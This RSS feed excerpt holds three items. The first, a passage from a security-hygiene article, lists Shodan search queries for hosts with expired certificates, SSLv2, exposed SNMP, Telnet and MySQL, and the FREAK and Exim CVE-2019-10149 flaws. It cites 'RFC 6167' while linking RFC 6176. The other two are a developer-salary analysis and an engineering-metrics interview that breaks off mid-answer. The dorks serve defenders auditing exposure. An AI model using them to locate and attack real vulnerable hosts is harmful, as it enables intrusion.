<p>If you have ever done systems administration of any type of Internet facing services, you have battled against time and expiration of X.509 certificates, which prove the identity of your service to its users. You’re probably thinking right now that wait, we should be talking about vulnerabilities, about CVEs, right? Remote code execution, the sexy stuff. My favorite retort to that is the following: the Equifax data breach which exposed the PII of 147 million people was largely caused by expired X.509 certificates in critical monitoring systems.&nbsp;</p>

<p>shodan dork: ssl.cert.expired:true&nbsp;</p>

<p>ref: <a href="https://www.csoonline.com/article/3444488/equifax-data-breach-faq-what-happened-who-was-affected-what-was-the-impact.html">https://www.csoonline.com/article/3444488/equifax-data-breach-faq-what-happened-who-was-affected-what-was-the-impact.html</a></p>

<h4 id="sslv2">SSLv2&nbsp;</h4>

<p>The arms race against crypt analysis has accelerated over the past couple of years. This means that cryptographic hashes or ciphers perfectly acceptable five years ago have become obsolete. SSL version 2 is a cryptographic protocol, which hasn’t met the requirement for Internet facing services for even longer. Its use was prohibited by RFC 6167 in 2011.&nbsp;</p>

<p>shodan dork: ssl.version:sslv2&nbsp;</p>

<p>ref: <a href="https://tools.ietf.org/html/rfc6176">https://tools.ietf.org/html/rfc6176&nbsp;</a></p>

<h4 id="exposed-snmp">Exposed SNMP&nbsp;</h4>

<p>Simple Network Management Protocol is very handy for gathering low-level information about networked devices and their status, especially in the switch and router space. As demonstrated by OUSPG PROTOS project in 2002, SNMP, whatever the version, is not and will not be a protocol fit for the Internet. Access to SNMP implementations must be access controlled to those devices, which are under your control, no matter which version of the protocol the device is speaking. Google “c06-snmp test suite” and assess the ramifications yourself, if you need more background on the issue. Moreover, threat actors have abused SNMP for reflected DDoS attacks for years, since sending a single spoofed UDP packet with the source address of the target will yield a huge amplification factor to their DDoS traffic.</p>

<p>shodan dork: port:161</p>

<p>shodan dork: port:161 snmp&nbsp;&nbsp;</p>

<p>ref: <a href="https://en.wikipedia.org/wiki/Oulu_University_Secure_Programming_Group">https://en.wikipedia.org/wiki/Oulu_University_Secure_Programming_Group</a>&nbsp;</p>

<h4 id="exposed-telnet">Exposed Telnet&nbsp;</h4>

<p>Before the advent of SSH, telnet was the de facto protocol for remote management or shell access to systems or devices. In 1995, a Finnish engineer called Tatu Ylönen invented SSH, which made the telnet obsolete overnight. 25 years later, however, telnet is still going strong for some reason. There simply is not any Internet facing use case for the service, period.&nbsp;</p>

<p>shodan dork: port:23</p>

<p>shodan dork: telnet</p>

<p>ref: <a href="https://en.wikipedia.org/wiki/Telnet">https://en.wikipedia.org/wiki/Telnet</a>&nbsp;</p>

<h4 id="exposed-mysql">Exposed MySQL&nbsp;</h4>

<p>Even if MySQL database engine is the de facto component as a backend service for many an Internet facing service, exposing it directly to the Internet without any further access control in front of it is inviting disaster. Recently, there was a major data breach in Finland, which allegedly resulted from the database backend being directly exposed to the Internet without any further access control in front of it. Layered security is not just a fancy buzz word. In many cases the database backend doesn’t even need to be reachable over the network at all, but when it does, access to it must be locked down to only those hosts, which actually need it.</p>

<p>shodan dork: product:”MySQL”&nbsp;</p>

<p>ref: <a href="https://vpsie.com/knowledge-base/securing-mysql-database-shared-hosting-environment/">https://vpsie.com/knowledge-base/securing-mysql-database-shared-hosting-environment/</a>&nbsp;</p>

<h4 id="cve-2015-0204-aka-freak">CVE-2015-0204 a.k.a. FREAK</h4>

<p>Compliance with US cryptographic export controls lies at the heart of this vulnerability. An Internet facing service simply should not support negotiation of an encrypted connection, which is possible to decipher using $100 worth of cloud computing resources. We could even rename this vulnerability, man-in-the-middle made easy.</p>

<p>shodan dork: vuln:CVE-2015-0204&nbsp;</p>

<p>ref: <a href="https://en.wikipedia.org/wiki/FREAK">https://en.wikipedia.org/wiki/FREAK</a></p>

<p>ref: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0204">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0204</a></p>

<h4 id="cve-2019-10149">CVE-2019-10149&nbsp;</h4>

<p>Exim is a popular Mail Transfer Agent, MTA, used in many mostly linux-based servers. It has had a mottled history with information security and in 2019, a serious flaw was discovered in it, which leads to remote code execution. Please note that using this dork especially, one must understand the implication of backporting security fixes and how they are reflected in the version banner.&nbsp;</p>

<p>shodan dork: vuln:CVE-2019-10149</p>

<p>ref: <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-10149">https://nvd.nist.gov/vuln/detail/CVE-2019-10149</a></p>

<h2 id="conclusions">Conclusions</h2>

<p>I know maintaining and repairing “bicycles” is tedious. This work, however, is the thing that will keep you safer and make it more difficult for the threat actors to attack you. I’m not saying that the threat actor’s initial access in the case of SolarWinds could’ve been prevented by addressing the specific issues I highlighted above, but it would’ve made it more difficult.</p>

<p>Building security in and making it layered is the only foundation you can build on that gives you predictability in a much more coherent way than investing in the magic security technology X that exploits the hype of the day. Building security in, means investing in people and processes as well.</p>

<p>One of the big challenges is that this type of information security work is not viewed as glorious or sought …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://arcticsecurity.com/guides/2021/02/12/solarwinds-going-beyond-attribution-all-in-a-days-work-for-a-bicycle-repair-man/">https://arcticsecurity.com/guides/2021/02/12/solarwinds-going-beyond-attribution-all-in-a-days-work-for-a-bicycle-repair-man/</a></em></p>]]>
            </description>
            <link>https://arcticsecurity.com/guides/2021/02/12/solarwinds-going-beyond-attribution-all-in-a-days-work-for-a-bicycle-repair-man/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26118736</guid>
            <pubDate>Fri, 12 Feb 2021 21:27:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Evolution of Developer Salaries: Looking Back 20 Years]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26118722">thread link</a>) | @jkchu
<br/>
February 12, 2021 | https://codesubmit.io/blog/the-evolution-of-developer-salaries/#tracing-developer-salaries-in-america-from-2001-to-2019 | <a href="https://web.archive.org/web/*/https://codesubmit.io/blog/the-evolution-of-developer-salaries/#tracing-developer-salaries-in-america-from-2001-to-2019">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <section>
                
                <div>
                    <p>Much has been covered about developer salaries based on coding language, location, job title, and so on. However, little has been done to chart the rise and fall of developer salaries over the years.</p><p>Tracing developer salaries over the last 20 years was an interesting endeavor. Researching the topic meant changing the language I used to search for data. <br>Back in the early 2000s, tech and software were referred to as “Information Technology” (IT) or “Information and Communications Technology” (ICT), developers were still referred to as “IT workers” and little was mentioned about the many specialized roles we have today.</p><p>To go back in time, I mainly referred to data published by the <a href="https://www.bls.gov/oes/tables.htm">U.S. Bureau of Labor Statistics</a> as they offered the most comprehensive year on year data. I looked at data from alternate years, from 2001 to 2019.</p><h2 id="starting-in-the-year-2000">Starting in the year 2000</h2><p>At the turn of the century, <a href="https://money.cnn.com/2000/07/21/career/q_degreecompsci/">CNN Money</a> reported that the average starting salary for an entry-level computer programmer was $40,800.</p><p>Fresh graduates were also paid differently based on the degrees they held:</p><ul><li>Computer engineering: $49,505</li><li>Computer science: $48,740</li><li>Information science: $38,900</li><li>Management information systems: $41,800</li></ul><p>Due to the shortage of skilled workers going into tech fields, salaries in America for IT graduates became more and more competitive. Salaries in 2000 were already 10% higher than the previous year and, apart from information science majors, were well above the <a href="https://www.naceweb.org/job-market/compensation/salary-trends-through-salary-survey-a-historical-perspective-on-starting-salaries-for-new-college-graduates">national average starting salary</a> of $39,824.</p><figure><img src="https://codesubmit.io/blog/content/images/2021/02/cs-grads-2000-2.png"><figcaption>The "IT Industry" looked different in 2000 than it does today</figcaption></figure><p>The following table shows the average annual salary for developers, programmers, and other IT-related job functions, across all industries in the year 2000:</p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th></th>
<th>Annual mean ($)</th>
<th>Annual median ($)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Computer &amp; Information Scientists, Researchers</td>
<td>73,430</td>
<td>70,590</td>
</tr>
<tr>
<td>Programmers</td>
<td>60,970</td>
<td>57,590</td>
</tr>
<tr>
<td>Software Engineers - Applications</td>
<td>70,300</td>
<td>67,670</td>
</tr>
<tr>
<td>Software Engineers - Systems Software</td>
<td>70,890</td>
<td>69,530</td>
</tr>
<tr>
<td>Computer Support Specialists</td>
<td>39,680</td>
<td>36,460</td>
</tr>
<tr>
<td>Database Administrators</td>
<td>55,810</td>
<td>51,990</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><h2 id="tracing-developer-salaries-in-america-from-2001-to-2019">Tracing developer salaries in America from 2001 to 2019</h2><h3 id="from-2001-to-2011"><br>From 2001 to 2011</h3><p>The graph below shows the annual median and mean salary from 2001 to 2011. These are the relevant job functions I examined, based on the data available from the Bureau of Labor Statistics:</p><ul><li>Computer and information scientists</li><li>Programmers</li><li>Software engineers - Applications</li><li>Software engineers - Systems software</li><li>Database administrators</li></ul><p>What is immediately noticeable is the huge difference between the median and mean salaries for various job functions across all industries, indicating a large difference in salaries for IT workers across the different sectors.</p><figure><img src="https://codesubmit.io/blog/content/images/2021/02/annual-median-salary1-11-1.png"><figcaption>Annual median salary across all industries for developers, 2001-2011</figcaption></figure><figure><img src="https://codesubmit.io/blog/content/images/2021/02/annual-mean-salary1-11-6.png"><figcaption>Annual mean salary across all industries for developers, 2001-2011</figcaption></figure><p>In the first decade alone, Americans experienced two huge economic crises, sending rippling effects throughout the American and global labor market. </p><p>2001 was the year the dot-com bubble burst. That year, while wages did not fall despite the dot-com burst, around 400,000 Americans working in IT-related roles lost their jobs going into 2001.</p><p>2008 was when the stock market crashed. Similar to the dot-com burst in 2001, wages in 2008 remained relatively unchanged. However, roughly 111,000 Americans working in IT-related fields lost their jobs going into 2009. </p><p>2008 was also the year when wages began to increase at a slower rate compared to previous years. While individuals enjoyed an average of $5,000 increase every two years previously, after 2008, wages only increased by $2,000 every two years. </p><p>Generally speaking, from 2001 to 2011, individuals working in tech had at least a 21% increase in wages over time. Systems Software Engineers experienced the largest jump in wages, an increase of 35%.</p><p><strong>Average salary increase from 2001-2011:</strong></p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th></th>
<th>2001 ($)</th>
<th>2011 ($)</th>
<th>Increase ($)</th>
<th>% Change</th>
</tr>
</thead>
<tbody>
<tr>
<td>Computer Software Engineers - Systems Software</td>
<td>74,490</td>
<td>100,420</td>
<td>25,930</td>
<td>+35%</td>
</tr>
<tr>
<td>Computer and Information Scientists</td>
<td>76,970</td>
<td>103,160</td>
<td>26,190</td>
<td>+34%</td>
</tr>
<tr>
<td>Database Administrators</td>
<td>58,420</td>
<td>77,350</td>
<td>18,930</td>
<td>+32%</td>
</tr>
<tr>
<td>Computer Software Engineers - Applications</td>
<td>72,370</td>
<td>92,080</td>
<td>19,710</td>
<td>+27%</td>
</tr>
<tr>
<td>Computer Programmers</td>
<td>62,890</td>
<td>76,010</td>
<td>13,220</td>
<td>+21%</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><h3 id="from-2013-to-2019">From 2013 to 2019</h3><p>From 2013 onwards, the Bureau of Labor Statistics changed how it categorized tech-related job functions. It added more job functions to the Computing category, mirroring how the profession had evolved since the early 2000s. </p><p>In light of this, I analyzed the broad job function groups available, rather than diving into specific job functions, to get a comprehensive overview of salaries.</p><p>Below are median and mean wages for the following job function groups:</p><ul><li>Computer and information research scientists</li><li>Computer and information analysts</li><li>Software developers and programmers (2019 data included Software Quality Assurance to this group)</li><li>Database and systems administrators and network architects</li><li>Computer support specialists</li></ul><figure><img src="https://codesubmit.io/blog/content/images/2021/02/annual-median-salary13-19.png"><figcaption>Annual median salary across all industries for developers, 2013-2019</figcaption></figure><figure><img src="https://codesubmit.io/blog/content/images/2021/02/annual-mean-salary13-19.png"><figcaption>Annual mean salary across all industries for developers, 2013-2019</figcaption></figure><p>In 2013, the <a href="https://www.naceweb.org/job-market/compensation/salary-trends-through-salary-survey-a-historical-perspective-on-starting-salaries-for-new-college-graduates">national American wage</a> for graduates was $45,327. Workers in tech continue to earn well above the national average. </p><p>Similar to the previous period, computer and information researchers continued to earn the most out of the group. In 2019, the average annual income for computer scientists was $127,460, 19% ahead of software developers, and programmers.</p><h2 id="fewer-programmers-more-developers">Fewer "programmers", more "developers"</h2><p>When analyzing salaries, it is also important to look at the employment numbers for job functions to get an indication of the supply and demand for specific skills in the labor market. </p><h3 id="computer-programmers">Computer programmers</h3><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th>Year</th>
<th>Total employed</th>
<th>Annual mean ($)</th>
</tr>
</thead>
<tbody>
<tr>
<td>2001</td>
<td>501,550</td>
<td>62,890</td>
</tr>
<tr>
<td>2003</td>
<td>431,640</td>
<td>64,510</td>
</tr>
<tr>
<td>2005</td>
<td>389,090</td>
<td>67,400</td>
</tr>
<tr>
<td>2007</td>
<td>394,710</td>
<td>72,010</td>
</tr>
<tr>
<td>2009</td>
<td>367,880</td>
<td>74,690</td>
</tr>
<tr>
<td>2011</td>
<td>320,100</td>
<td>76,010</td>
</tr>
<tr>
<td>2013</td>
<td>312,340</td>
<td>80,930</td>
</tr>
<tr>
<td>2015</td>
<td>289,420</td>
<td>84,360</td>
</tr>
<tr>
<td>2017</td>
<td>247,690</td>
<td>87,530</td>
</tr>
<tr>
<td>2019</td>
<td>199,540</td>
<td>92,610</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p>In 20 years, we can see a <strong>60% drop</strong> in the number of people employed for computer programming roles in America. Annual wages, on the other hand, increased by 47% in the same period.</p><h3 id="software-developers">Software developers</h3><p>In this section, I removed 2019 data as I was unable to separate developer functions, whether they specialized in applications or systems.</p><p><strong>Applications Developers:</strong></p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th>Year</th>
<th>Total employed</th>
<th>Annual mean ($)</th>
</tr>
</thead>
<tbody>
<tr>
<td>2001</td>
<td>361,690</td>
<td>72,370</td>
</tr>
<tr>
<td>2003</td>
<td>392,140</td>
<td>75,750</td>
</tr>
<tr>
<td>2005</td>
<td>455,980</td>
<td>79,540</td>
</tr>
<tr>
<td>2007</td>
<td>495,810</td>
<td>85,660</td>
</tr>
<tr>
<td>2009</td>
<td>495,500</td>
<td>90,170</td>
</tr>
<tr>
<td>2011</td>
<td>539,880</td>
<td>92,080</td>
</tr>
<tr>
<td>2013</td>
<td>643,830</td>
<td>96,260</td>
</tr>
<tr>
<td>2015</td>
<td>747,730</td>
<td>102,160</td>
</tr>
<tr>
<td>2017</td>
<td>849,230</td>
<td>106,710</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p>The number of software developers hired to work on applications has increased by 135% from 2001 to 2017. Annual salaries increased by 47% in that period.</p><p><strong>Systems developers:</strong></p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th>Year</th>
<th>Total employed</th>
<th>Annual mean ($)</th>
</tr>
</thead>
<tbody>
<tr>
<td>2001</td>
<td>261,520</td>
<td>74,490</td>
</tr>
<tr>
<td>2003</td>
<td>285,760</td>
<td>78,400</td>
</tr>
<tr>
<td>2005</td>
<td>320,720</td>
<td>84,310</td>
</tr>
<tr>
<td>2007</td>
<td>349,140</td>
<td>90,780</td>
</tr>
<tr>
<td>2009</td>
<td>385,200</td>
<td>96,620</td>
</tr>
<tr>
<td>2011</td>
<td>387,050</td>
<td>100,420</td>
</tr>
<tr>
<td>2013</td>
<td>373,510</td>
<td>104,480</td>
</tr>
<tr>
<td>2015</td>
<td>390,750</td>
<td>108,760</td>
</tr>
<tr>
<td>2017</td>
<td>394,590</td>
<td>111,780</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p>Systems developers increased by only 50% in the same period, with average wages increasing by 50% as well. </p><p><strong>Web developers:</strong></p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th>Year</th>
<th>Total employed</th>
<th>Annual mean ($)</th>
</tr>
</thead>
<tbody>
<tr>
<td>2013</td>
<td>112,820</td>
<td>67,540</td>
</tr>
<tr>
<td>2015</td>
<td>127,070</td>
<td>70,660</td>
</tr>
<tr>
<td>2017</td>
<td>125,890</td>
<td>74,110</td>
</tr>
<tr>
<td>2019</td>
<td>148,340</td>
<td>82,370</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p>For web developers, we can see that the total number of employed professionals increased by 31% in just seven years. The average wages for this job function also increased by 21%.</p><h2 id="are-developer-wages-stagnating">Are developer wages stagnating?</h2><p>Looking at the data, we can see that developer salaries are not increasing at the rate they used to. As we head into 2013 through to 2019, the annual mean salary for developers and programmers increased from $92,820 to $106,980, a mere 15% increase compared to the whopping 21% increase experienced in the previous decade.</p><p><strong>Average salary increase from 2013-2019:</strong></p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th></th>
<th>2013 ($)</th>
<th>2019 ($)</th>
<th>Increase ($)</th>
<th>% Change</th>
</tr>
</thead>
<tbody>
<tr>
<td>Computer and Information Research Scientists</td>
<td>109,260</td>
<td>127,460</td>
<td>18,200</td>
<td>+17%</td>
</tr>
<tr>
<td>Computer and Information Analysts</td>
<td>86,100</td>
<td>97,570</td>
<td>11,470</td>
<td>+13%</td>
</tr>
<tr>
<td>Software Developers and Programmers</td>
<td>92,820</td>
<td>106,980</td>
<td>14,160</td>
<td>+15%</td>
</tr>
<tr>
<td>Systems Administrators and Network Architects</td>
<td>82,960</td>
<td>96,380</td>
<td>13,420</td>
<td>+16%</td>
</tr>
<tr>
<td>Computer Support Specialists</td>
<td>53,660</td>
<td>59,290</td>
<td>5,630</td>
<td>+10%</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p>One of the reasons for the slower rate of increase is that the data does not show wages based on seniority and experience. Today, there are more entry-level and junior roles available compared to the early 2000s, and there are more people able to fill those roles. </p><p>Interestingly, in <a href="https://insights.stackoverflow.com/survey/2015#profile-education">2015</a>, Stack Overflow reported that 42% of developers indicated they were self-taught while in <a href="https://insights.stackoverflow.com/survey/2019#education">2019</a>, 63% of developers said they majored in computer science, computer engineering, or software engineering, with 86% of respondents reporting to have taught themselves a new language, framework or tool without taking a formal course. </p><p>Another survey by <a href="https://insights.dice.com/2020/02/21/technology-job-newbies-face-stagnant-salaries/">Dice</a> reported that while wages have dropped for developers with less than two years experience, salaries pick up after the three-year mark. Much like other jobs, developer salaries increase with more experience they accumulate.</p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th>Years of Technical Experience</th>
<th>2018</th>
<th>2019</th>
<th>% Change</th>
</tr>
</thead>
<tbody>
<tr>
<td>Less than 1 year</td>
<td>$57,541</td>
<td>$55,231</td>
<td>-4.00%</td>
</tr>
<tr>
<td>1 - 2 years</td>
<td>$58,755</td>
<td>$58,718</td>
<td>-0.10%</td>
</tr>
<tr>
<td>3 - 5 years</td>
<td>$69,671</td>
<td>$74,706</td>
<td>7.20%</td>
</tr>
<tr>
<td>6 - 10 years</td>
<td>$82,094</td>
<td>$85,927</td>
<td>4.70%</td>
</tr>
<tr>
<td>11 - 15 years</td>
<td>$96,421</td>
<td>$99,138</td>
<td>2.80%</td>
</tr>
<tr>
<td>More than 15 years</td>
<td>$113,503</td>
<td>$114,915</td>
<td>1.20%</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><h2 id="what-to-expect-in-the-future">What to expect in the future</h2><p>In the years to come, industry experts expect <a href="https://medium.com/predict/are-programmers-headed-toward-another-bursting-bubble-528e30c59a0e">low-level coding and programming jobs to become obsolete</a> with the development of new tools that remove the need to code completely. Take for example the role of Web Developers when it comes to building websites. With popular CMS tools like WordPress and Squarespace, almost anyone can build a website for their business, reducing the need for people who know “just a little bit of front end web development”. </p><p>As automation takes away the need for “basic” coding jobs, new skills or a combination of skills will be needed in the future for roles that don’t even exist yet. The need for field experts and true problem solvers will never disappear. The key is to adapt and learn as new technologies emerge. </p><p><strong>Additional sources:</strong><br><a href="http://www.oecd.org/digital/ieconomy/1939833.pdf">OECD Technology Outlook Report 2000</a><br><a href="http://www.oecd.org/sti/ieconomy/37620123.pdf">OECD Technology Outlook Report 2004</a><br><a href="https://www.oecd-ilibrary.org/docserver/it_outlook-2010-sum-en.pdf?expires=1612698150&amp;id=id&amp;accname=guest&amp;checksum=7DC9765AA37510F78D7BBDA7FF42254D">OECD Information Technology Outlook Summary 2010</a><br><a href="https://docs.google.com/spreadsheets/d/1iGfVr1j-VStKVwSWvVvSo3qbwwHTL_V9tPttpeBTmK4/edit?usp=sharing">BLS data in Google Sheets</a></p>
                </div>
  …</section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://codesubmit.io/blog/the-evolution-of-developer-salaries/#tracing-developer-salaries-in-america-from-2001-to-2019">https://codesubmit.io/blog/the-evolution-of-developer-salaries/#tracing-developer-salaries-in-america-from-2001-to-2019</a></em></p>]]>
            </description>
            <link>https://codesubmit.io/blog/the-evolution-of-developer-salaries/#tracing-developer-salaries-in-america-from-2001-to-2019</link>
            <guid isPermaLink="false">hacker-news-small-sites-26118722</guid>
            <pubDate>Fri, 12 Feb 2021 21:26:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[First Principles of Engineering Metrics]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26118547">thread link</a>) | @thellimist
<br/>
February 12, 2021 | https://managersclub.com/kan-yilmaz-metrics-for-engineering-teams/ | <a href="https://web.archive.org/web/*/https://managersclub.com/kan-yilmaz-metrics-for-engineering-teams/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article aria-label="Kan Yilmaz, Co-Founder at Haystack, on Metrics for Engineering Teams"><div>
<figure><img loading="lazy" width="1024" height="1024" src="https://managersclub.com/wp-content/uploads/2021/02/profilewithhair-1024x1024.jpg" alt="" srcset="https://managersclub.com/wp-content/uploads/2021/02/profilewithhair-1024x1024.jpg 1024w, https://managersclub.com/wp-content/uploads/2021/02/profilewithhair-300x300.jpg 300w, https://managersclub.com/wp-content/uploads/2021/02/profilewithhair-150x150.jpg 150w, https://managersclub.com/wp-content/uploads/2021/02/profilewithhair-768x768.jpg 768w, https://managersclub.com/wp-content/uploads/2021/02/profilewithhair.jpg 1052w" sizes="(max-width: 1024px) 100vw, 1024px" data-srcset="https://managersclub.com/wp-content/uploads/2021/02/profilewithhair-1024x1024.jpg 1024w, https://managersclub.com/wp-content/uploads/2021/02/profilewithhair-300x300.jpg 300w, https://managersclub.com/wp-content/uploads/2021/02/profilewithhair-150x150.jpg 150w, https://managersclub.com/wp-content/uploads/2021/02/profilewithhair-768x768.jpg 768w, https://managersclub.com/wp-content/uploads/2021/02/profilewithhair.jpg 1052w" data-src="https://managersclub.com/wp-content/uploads/2021/02/profilewithhair-1024x1024.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure>







<p><strong>Vidal: </strong>[00:00] Good morning today I have with me, Kan Yilmaz. Welcome to ManagersClub.</p>



<p><strong>Kan: </strong>[00:06] Thank you, Vidal.</p>



<h2>About Metrics</h2>



<p><strong>Vidal: </strong>[00:07] Kan you are an expert in engineering metrics. I was really impressed that the discussion we had about engineering metrics last week. Could you tell people how did you get so interested in engineering metrics?</p>



<p><strong>Kan: </strong>[00:20] It wasn’t specifically about engineering metrics. What made me interested in this topic was there were engineers, and we are proud to say that we are logical. We acknowledge data, and we make decisions better based off of data. But once we look into an engineering organization, the application yes, we have lots of data, and we make really good decisions on the application. </p>



<p>But once we go into the process of how do we actually do this engineering process? We don’t have the data, and we don’t use anything. Everything is mostly based on gut feeling. And that made me uncomfortable. I wanted to figure out why engineering among all different organizational teams, such as sales or marketing, did not use any data, whereas every single other one did. So I went into that problem, and that led me to metrics itself.</p>



<p><strong>Vidal: </strong>[01:19] How long have you been working in this field of engineering data and metrics?</p>



<p><strong>Kan: </strong>[01:24] So I had been working on this for more than a year and a half full-time talking to people of understanding why they are using metrics. What is the reason and how does it make our lives better?</p>



<h2>The Goal of Metrics</h2>



<p><strong>Vidal: </strong>[01:39] What is the goal of metrics? Why should we care about these?</p>



<p><strong>Kan: </strong>[01:43] Why do we track anything? Why do we have metrics? The base reason is to align people to a specific goal. For companies, this is revenue. We have a single goal, to make sure that the company is profitable. That is our metric to track.</p>



<p>And this goes into every different even if you’re like having, let’s say you want to lose weight, you have a goal. And the metric represents that, which is how many kilos are you at the moment? For engineering, this was missing. So I was really interested in what should the engineering organization track.</p>



<p><strong>Vidal: </strong>[02:21] You’ve also spoken with hundreds of engineering managers.&nbsp; And that’s how we connected. What are some common mistakes or misunderstandings that managers have on this topic?</p>



<h2>Common Mistakes</h2>



<p><strong>Kan: </strong>[02:32] So there are a few mistakes that they do. The first one is the obvious one, which is big brother. You’re tracking all of my actions, and that sounds like big brother. You don’t want to be tracked — it feels from an engineer’s perspective, it doesn’t feel good. And there’s a reason for this. People have tracked engineers with the wrong metrics. There’s this guy called <a href="https://amzn.to/39W8NhG" target="_blank" rel="noreferrer noopener sponsored nofollow">Eliyahu Goldratt. He wrote the book, The Goal.</a> And in his book, he specifically mentioned that <strong>if you track anybody with metrics that can not control that they won’t care.</strong></p>



<div><figure><a href="https://amzn.to/2N4jp5f" target="_blank" rel="noopener"><img src="https://m.media-amazon.com/images/I/519C2Gz-v2L.jpg" alt="" data-src="https://m.media-amazon.com/images/I/519C2Gz-v2L.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a></figure></div>



<p>And that is what happens in engineering metrics. They try to track engineers with metrics that they don’t control. That is the biggest mistake that I have seen. The second biggest mistake is tracking metrics, which doesn’t and result into the organization success. </p>



<p>So an example of this is the number of commits. That has no correlation whatsoever with the company’s success, and a lot of companies track the number of commits and other ones lines of code. These are numbers. You can track them, but it doesn’t mean anything, and it won’t make your company successful because of this. The engineers themselves —&nbsp; they know it internally. They know that it doesn’t represent the company’s success and they feel like “I’m just being tracked by an arbitrary number.” And it goes back into something that doesn’t matter. </p>



<p>So you need to make sure that you’re tracking two different things. One is that the team can control those metrics. The second point is those metrics actually align with the company’s goals.</p>



<p><strong>Vidal: </strong>[04:13] I think that’s a great point. Yes. If you can’t really control the metric, what do you, what are you going to do? Just pray that it changes? </p>



<h2>Two Best Practices</h2>



<p><strong>Vidal:</strong> We talked about some of the mistakes people make. What do you understand to be some of the best practices? What should people do?</p>



<p><strong>Kan: </strong>[04:26] Specifically for engineering teams, I will be by default, I’ll mention about product engineering. That is where we have figured out what metrics to track. I don’t know about R &amp; D or other departments of engineering, so there’s a distinction between that for product engineering, what are the best practices of tracking.</p>



<p>It goes into the team level. <strong>If you track the individual level, what happens usually is you don’t get the signal of the process. You get the signal of the person, and it’s a shaky number.</strong> A person might work hard today, but tomorrow they might do design, and the next day they might actually have lots of meetings.</p>



<p>And if you try to track it by a single number, you’ll get lots of spiky graphs and that won’t result into actionable results. But if you do that in team level, You will actually get a really good understanding of what the process is. And if I do any kind of iteration in my process, you can see that change in that team’s habits and in that team’s metrics. So that is one best practice that I can say. <strong>Don’t track individuals, track teams</strong>. </p>



<p>The second best practice is, this goes into the mistakes as well, make sure that the team can control the metric itself. Most of the teams that I have seen tried to put product metrics inside engineering organizations.</p>



<p>How I will describe it in this way, monthly active users. I have seen quite a few engineering teams being judged on monthly active users. There are other metrics such as JIRA tasks completed, or it’s usually goes into story points completed. Story points completed is again, it looks fine. You think that it represents the delivery of that specific team.</p>



<p>The problem with story points is it’s inaccurate. It’s inaccurate because the engineers do not fill it in at the correct time. And this produces such a chaotic environment where you don’t get actionable insights from tracking story points to be able to do that. </p>



<p>There is a workaround. It’s not like you cannot do it. You can do it. You need to make sure that story points are accurate and people are not gaming. So there are, those are a bit hard problems to solve. I have seen people solving those problems but <strong>I would generally recommend not tracking product-related metrics for engineering.</strong></p>



<p>There are much, much better metrics to track.&nbsp; We can go over that if you want.</p>



<h2>Metrics for Product Engineering Teams</h2>



<p><strong>Vidal: </strong>[07:00] I’d like to. I think that’s a great point you make about confusing the product metrics.&nbsp; What are some of the appropriate metrics to track for product engineering teams?</p>



<p><strong>Kan: </strong>[07:10] Okay. Let’s go from the fundamentals again. Back to the conversational starting point. I said the metrics they need to represent organization success. What that means is decreased churn, increased revenue. What metrics represent this? </p>



<p>In product engineering, imagine a car. This is the product itself, the organization itself. The driver is the product manager. They can make decisions on where to go on the road. But they don’t decide on the speed. The speed is decided by engineering.&nbsp;The engineering organization is the engine of this car. And how do we make sure that the car goes fast?</p>



<p>That is the <strong>number of successful iterations</strong>. <strong>That is the core metric that product engineering teams should track</strong>. What does the number of successful iterations mean? The number of iterations is quite obvious in the sense of, okay, if I do a deployment, then I did an iteration. I gave value to customers. </p>



<p>But if you just track that metric, what happens is we have seen this in multiple companies. The engineering manager says, “Hey let’s iterate faster. How can we iterate faster?” And the team response. “Let’s not write&nbsp;tests. We spend 20% of our time writing tests…” and that doesn’t work out. Then you have a faulty product.</p>



<p>It’s not a successful iteration. The customer didn’t get value from that deployment. You need to make sure that the iteration is fast and it’s successful. So what are the metrics to track these? I would Put this into five different metrics.&nbsp; I’ll take one step back. I’ll represent this into two different categories.</p>



<p>One product engineering, second DevOps team. I will focus on product engineering and they have four different metrics. It divides into speed and quality. Just like I said, number of successful iterations. The speed part is deployment frequency and cycle time. <strong>Deployment frequency</strong> is how often do you deploy? That’s quite obvious by itself. </p>



<p>Then we go to <strong>cycle time</strong>. Cycle time can be tracked into different ways. Some people track it from JIRA, a single task. How long did it take for a single JIRA task to complete? The second way to track it is how long did a single pull request take to complete by complete I mean start to deployment.</p>



